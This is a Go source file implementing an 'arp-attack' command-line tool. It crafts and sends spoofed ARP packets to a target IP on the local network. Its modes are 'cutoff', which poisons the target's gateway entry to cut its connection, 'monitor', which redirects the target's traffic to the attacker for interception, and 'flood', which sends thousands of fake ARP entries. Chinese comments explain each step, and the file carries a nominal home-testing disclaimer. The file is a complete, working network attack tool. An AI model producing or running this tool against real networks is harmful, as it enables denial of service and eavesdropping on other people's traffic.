package cmd

import (
	"crypto/rand"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/spf13/cobra"
)

// 仅供家庭环境测试学习 (小心踩缝纫机)

func init() {
	var cmd = &cobra.Command{
		Use:  "arp-attack {target_ip}",
		Run:  Safely(ArpAttack),
		Args: cobra.MatchAll(cobra.ExactArgs(1), cobra.OnlyValidArgs),
	}
	cmd.PersistentFlags().String("mode", "cutoff", "cutoff or monitor or flood")
	cmd.PersistentFlags().Uint32("cnt", 5, "cnt of fake arp req")
	cmd.PersistentFlags().Uint32("delay", 3, "delay of fake arp req")
	rootCmd.AddCommand(cmd)
}

var (
	localMac, localIp   []byte
	targetMac, targetIp []byte
	cnt, delay          uint32
)

func ArpAttack(cmd *cobra.Command, args []string) {
	// 1. 解析参数
	mode, _ := cmd.PersistentFlags().GetString("mode")
	cnt, _ = cmd.PersistentFlags().GetUint32("cnt")
	delay, _ = cmd.PersistentFlags().GetUint32("delay")
	info, err := GatherNetInfo()
	if err != nil {
		log.Fatal(err)
	}
	ifaceName := info.Name
	localMac, _ = net.ParseMAC(info.Mac)             // 本机mac
	localIp = net.ParseIP(info.Ip).To4()             // 本机ip
	targetMac, _ = net.ParseMAC("ff:ff:ff:ff:ff:ff") // 广播mac
	targetIp = net.ParseIP(args[0]).To4()            // 目标ip
	// 2. 获取网卡handle
	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("pcap.OpenLive failed: %v", err)
	}
	defer handle.Close()
	// 3. 执行任务
	targetGw, _ := GetGwAndBc(net.IP(targetIp).String(), "255.255.255.0") // 猜测目标网关
	dur := time.Duration(delay) * time.Second
	var (
		fakePack  []byte
		fakePacks [][]byte
	)
	switch mode {
	case "cutoff": // 断网
		// 目标机器的arp表, 网关ip指向一个不存在的mac
		fakePack = createFakeArpPack(getRandomMac(), net.ParseIP(targetGw).To4())
	case "monitor": // 监听
		// 目标机器的arp表, 网关ip指向本机mac
		fakePack = createFakeArpPack(localMac, net.ParseIP(targetGw).To4())
	case "flood": // 洪泛
		if mode == "flood" {
			dur = 10 * time.Millisecond
			cnt = 10000
		}
		for i := uint32(0); i < cnt; i++ {
			fakePacks = append(fakePacks, createFakeArpPack(getRandomMac(), getRandomIp()))
		}
	default: // 发一个正确的包
		log.Println("you are a good guy")
		fakePack = createFakeArpPack(localMac, localIp)
	}
	for i := uint32(0); i < cnt; i++ {
		pack := fakePack
		if mode == "flood" {
			pack = fakePacks[i]
		}
		if err := handle.WritePacketData(pack); err != nil {
			log.Fatalf("handle.WritePacketData failed: %v", err)
		}
		fmt.Printf("fake arp req sent successfully, %d/%d\n", i+1, cnt)
		time.Sleep(dur)
	}
}

// createFakeArpPack 生成虚假的arp请求包
func createFakeArpPack(fakeMac, fakeIp []byte) []byte {
	ethLayer := &layers.Ethernet{
		SrcMAC:       localMac,  // 本地mac (真实), 也可以用fakeMac, 隐藏自身
		DstMAC:       targetMac, // 广播mac
		EthernetType: layers.EthernetTypeARP,
	}
	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   fakeMac, // 虚假的本地mac
		SourceProtAddress: fakeIp,  // 虚假的本地ip
		DstHwAddress:      targetMac,
		DstProtAddress:    targetIp, // 目标ip, 目标判断该值与其ip一致会回包, 并缓存fakeMac和fakeIp
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, ethLayer, arpLayer); err != nil {
		log.Fatalf("gopacket.SerializeLayer failed: %v", err)
	}
	return buf.Bytes()
}

func getRandomMac() net.HardwareAddr {
	mac := make([]byte, 6)
	rand.Read(mac)
	mac[0] = (mac[0] | 2) & 0xfe // 设置局部管理地址LAA, 避免与实际MAC地址冲突
	return net.HardwareAddr(mac)
}

func getRandomIp() net.IP {
	ip := make(net.IP, 4)
	rand.Read(ip)
	ip[0] = 192
	ip[1] = 168 // 192.168.0.0/16
	return ip
}
